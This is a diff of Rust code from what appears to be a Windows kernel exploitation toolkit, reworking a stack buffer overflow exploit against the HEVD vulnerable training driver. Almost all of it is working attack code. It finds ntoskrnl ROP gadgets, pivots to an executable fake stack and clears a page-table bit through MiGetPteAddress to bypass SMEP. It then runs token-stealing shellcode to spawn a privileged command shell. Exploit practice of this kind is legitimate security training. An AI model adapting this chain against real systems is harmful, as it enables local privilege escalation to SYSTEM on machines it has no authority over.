@@ -2,25 +2,39 @@ use core::ffi::c_void;
 use std::iter;
 
 use win_kexp::rop::find_gadget_offset;
-use win_kexp::shellcode::token_stealing_shellcode_smep_no_kvashadow;
+use win_kexp::shellcode::token_stealing_shellcode_smep_no_kvashadow_pte;
 use win_kexp::util::bytes_to_hex_string;
-use win_kexp::{create_rop_chain, CTL_CODE, IOCTL};
+use win_kexp::win32k::{allocate_memory, lock_memory, PAGE_EXECUTE_READWRITE};
+use win_kexp::{create_rop_chain, create_rop_chain_to_buffer, CTL_CODE, IOCTL};
 use win_kexp::{
     rop::get_executable_sections,
     win32k::{
         allocate_shellcode, close_handle, create_cmd_process, get_device_handle,
         get_ntoskrnl_base_address, io_device_control, load_library_no_resolve, FILE_ANY_ACCESS,
-        FILE_DEVICE_UNKNOWN, METHOD_NEITHER,
+        FILE_DEVICE_UNKNOWN, MEM_COMMIT, MEM_RESERVE, METHOD_NEITHER,
     },
 };
 
 const HEVD_IOCTL_BUFFER_OVERFLOW_STACK: u32 = IOCTL!(0x800);
+
+fn find_gadget_offset_with_annotation(
+    sections: &Vec<(u64, Vec<u8>)>,
+    gadget: &[u8],
+    kernel_base: u64,
+    annotation: &str,
+) -> u64 {
+    let offset =
+        find_gadget_offset(sections, gadget, kernel_base).expect("[-] Failed to find gadget");
+    println!("[+] Found gadget {annotation} at 0x{offset:x}");
+    offset
+}
 
 fn build_smep_disable_rop_chain(
     krnl_name: &str,
     kernel_base: u64,
     base_offset: usize,
     shellcode_address: u64,
+    fake_stack: *mut c_void,
 ) -> Vec<u8> {
     let mi_get_pte_address = kernel_base + 0x288b28u64;
     println!("[+] MiGetPteAddress address: 0x{mi_get_pte_address:x}");
@@ -29,42 +43,156 @@ fn build_smep_disable_rop_chain(
     let sections =
         get_executable_sections(ntoskrnl_handle).expect("[-] Failed to get executable sections");
 
-    let pop_rcx_ret_address = find_gadget_offset(&sections, &[0x59, 0xC3], kernel_base)
-        .expect("[-] Failed to find pop rcx ; ret gadget");
-    println!("[+] Found pop rcx ; ret gadget at 0x{pop_rcx_ret_address:x}");
+    let pop_rcx_ret_address =
+        find_gadget_offset_with_annotation(&sections, &[0x59, 0xC3], kernel_base, "pop rcx ; ret");
 
-    let pop_rax_ret_address = find_gadget_offset(&sections, &[0x58, 0xC3], kernel_base)
-        .expect("[-] Failed to find pop rax ; ret gadget");
-    println!("[+] Found pop rax ; ret gadget at 0x{pop_rax_ret_address:x}");
+    let pop_r15_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x41, 0x5F, 0xC3],
+        kernel_base,
+        "pop r15 ; ret",
+    );
 
-    let push_rax_ret_address = find_gadget_offset(&sections, &[0x36, 0x50, 0xC3], kernel_base)
-        .expect("[-] Failed to find push rax ; ret gadget");
-    println!("[+] Found push rax ; ret gadget at 0x{push_rax_ret_address:x}");
+    let pop_rax_ret_address =
+        find_gadget_offset_with_annotation(&sections, &[0x58, 0xC3], kernel_base, "pop rax ; ret");
 
-    let mov_deref_rax_rcx_ret_address =
-        find_gadget_offset(&sections, &[0x48, 0x89, 0x08, 0xC3], kernel_base)
-            .expect("[-] Failed to find mov qword [rax], rcx ; ret gadget");
-    println!("[+] Found mov qword [rax], rcx ; ret gadget at 0x{mov_deref_rax_rcx_ret_address:x}");
+    let push_rax_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x36, 0x50, 0xC3],
+        kernel_base,
+        "push rax ; ret",
+    );
 
-    let wbinvd_ret_address = find_gadget_offset(&sections, &[0x0F, 0x09, 0xC3], kernel_base)
-        .expect("[-] Failed to find wbinvd ; ret gadget");
-    println!("[+] Found wbinvd ; ret gadget at 0x{wbinvd_ret_address:x}");
+    let mov_r8_rax_mov_rax_r8_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x4C, 0x8B, 0xC0, 0x49, 0x8B, 0xC0, 0xC3],
+        kernel_base,
+        "mov r8, rax ; mov rax, r8 ; ret",
+    );
 
-    let rop_chain = create_rop_chain!(
-        base_offset,
+    let mov_rcx_r8_mov_rax_rcx_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x49, 0x8B, 0xC8, 0x48, 0x8B, 0xC1, 0xC3],
+        kernel_base,
+        "mov rcx, r8 ; mov rax, rcx ; ret",
+    );
+
+    let xor_deref_rcx_rax_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x48, 0x31, 0x01, 0xC3],
+        kernel_base,
+        "xor deref rcx, rax ; ret",
+    );
+
+    let mov_deref_r8_rcx_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x49, 0x89, 0x08, 0xC3],
+        kernel_base,
+        "mov deref r8, rcx ; ret",
+    );
+
+    let pop_r8_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x41, 0x58, 0xC3],
+        kernel_base,
+        "pop r8 ; ret",
+    );
+
+    let pop_rsp_ret_address =
+        find_gadget_offset_with_annotation(&sections, &[0x5C, 0xC3], kernel_base, "pop rsp ; ret");
+
+    let mov_esp_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0xBC, 0x1B, 0x8F, 0x41, 0x23, 0xC3],
+        kernel_base,
+        "mov esp, 0xC48348FF ; ret",
+    );
+
+    let add_rsp_28_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x48, 0x83, 0xC4, 0x28, 0xC3],
+        kernel_base,
+        "add rsp, 0x28 ; ret",
+    );
+
+    let pop_r9_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x41, 0x59, 0xC3],
+        kernel_base,
+        "pop r9 ; ret",
+    );
+
+    let add_rcx_r9_cmp_r8_rcx_setae_al_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x49, 0x03, 0xC9, 0x4C, 0x3B, 0xC1, 0x0F, 0x93, 0xC0, 0xC3],
+        kernel_base,
+        "add rcx, r9 ; cmp r8, rcx ; setae al ; ret",
+    );
+
+    let mov_rcx_qword_rcx_ret_address = find_gadget_offset_with_annotation(
+        &sections,
+        &[0x48, 0x8B, 0x09, 0x48, 0x3B, 0xCA, 0x0F, 0x94, 0xC0, 0xC3],
+        kernel_base,
+        "mov rcx, qword [rcx] ; cmp rcx, rdx ; sete al ; ret",
+    );
+
+    let fake_stack_address = fake_stack.wrapping_add(0x18f1b) as u64;
+
+    let fake_stack_slice =
+        unsafe { std::slice::from_raw_parts_mut(fake_stack_address as *mut u8, 0x1400) };
+
+    create_rop_chain_to_buffer!(
+        fake_stack_slice,
+        pop_r8_ret_address,
+        fake_stack_address + 43 * 8,
+        pop_r9_ret_address,
+        0x28_u64,
+        add_rcx_r9_cmp_r8_rcx_setae_al_ret_address,
+        mov_deref_r8_rcx_ret_address,
+        pop_r8_ret_address,
+        fake_stack_address + 41 * 8,
+        pop_r9_ret_address,
+        0x88_u64,
+        add_rcx_r9_cmp_r8_rcx_setae_al_ret_address,
+        mov_rcx_qword_rcx_ret_address,
+        mov_deref_r8_rcx_ret_address,
+        pop_rcx_ret_address,
+        fake_stack_address,
+        pop_rax_ret_address,
+        mi_get_pte_address,
+        push_rax_ret_address,
+        mov_r8_rax_mov_rax_r8_ret_address,
+        mov_rcx_r8_mov_rax_rcx_ret_address,
+        pop_rax_ret_address,
+        0x000000000000004u64,
+        xor_deref_rcx_rax_ret_address,
         pop_rcx_ret_address,
         shellcode_address,
         pop_rax_ret_address,
         mi_get_pte_address,
         push_rax_ret_address,
-        pop_rcx_ret_address,
-        0x63u64,
-        mov_deref_rax_rcx_ret_address,
-        wbinvd_ret_address,
+        mov_r8_rax_mov_rax_r8_ret_address,
+        mov_rcx_r8_mov_rax_rcx_ret_address,
+        pop_rax_ret_address,
+        0x000000000000004u64,
+        xor_deref_rcx_rax_ret_address,
+        add_rsp_28_ret_address,
+        0x4444444444444444u64,
+        0x4444444444444444u64,
+        0x4444444444444444u64,
+        0x4444444444444444u64,
+        0x4444444444444444u64,
         shellcode_address,
+        pop_r15_ret_address,
+        0x4444444444444444u64,
+        pop_rsp_ret_address,
     );
 
-    rop_chain
+    println!("[+] Main rop chain written to fake stack");
+
+    let main_rop_chain = create_rop_chain!(base_offset, mov_esp_ret_address,);
+
+    main_rop_chain
 }
 
 fn exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow() {
@@ -84,8 +212,11 @@ fn exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow() {
     println!("[+] Ntoskrnl base address: 0x{ntoskrnl_address:x}");
 
     println!("[+] Building payload...");
-    let shellcode = token_stealing_shellcode_smep_no_kvashadow();
-    let (payload, payload_len) = allocate_shellcode(shellcode.as_ptr(), shellcode.len());
+    let shellcode = token_stealing_shellcode_smep_no_kvashadow_pte();
+    let (payload, payload_len) = unsafe { allocate_shellcode(shellcode.as_ptr(), shellcode.len()) };
+    unsafe {
+        lock_memory(payload, payload_len);
+    }
 
     let payload_address = payload as u64;
     let bytes = bytes_to_hex_string(payload, payload_len);
@@ -95,11 +226,26 @@ fn exploit_stack_buffer_overflow_token_stealing_smep_no_kvashadow() {
 
     let ret_overwrite_offset = 0x818;
 
+    let fake_stack = allocate_memory(
+        0x23400000_u64,
+        0x28000,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE,
+    );
+    if fake_stack.is_null() {
+        panic!("[-] Failed to allocate fake stack memory");
+    }
+    unsafe {
+        std::ptr::write_bytes(fake_stack, 0x41, 0x28000);
+        lock_memory(fake_stack, 0x28000);
+    }
+
     let user_buffer = build_smep_disable_rop_chain(
         "ntoskrnl.exe",
         ntoskrnl_address,
         ret_overwrite_offset,
         payload_address,
+        fake_stack,
     );
 
     println!("[+] Triggering stack buffer overflow...");
